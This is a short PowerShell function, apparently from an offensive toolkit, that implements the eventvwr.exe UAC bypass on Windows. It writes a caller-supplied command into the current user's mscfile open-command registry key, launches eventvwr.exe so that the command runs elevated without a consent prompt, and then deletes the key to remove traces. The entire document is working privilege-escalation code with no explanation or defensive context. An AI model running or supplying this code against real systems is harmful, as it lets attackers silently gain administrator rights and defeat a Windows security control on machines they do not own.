function BypassUAC-HackPlayers-Eventvwr {
param ([string]$comando)
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command -force | out-null
$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
set-item $Key $comando
Start-Process eventvwr.exe -; sleep -Seconds 3
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile -Force | out-null
}


